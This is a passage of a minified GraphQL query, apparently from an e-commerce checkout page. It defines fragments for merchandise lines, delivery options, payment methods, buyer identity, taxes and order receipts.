IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on 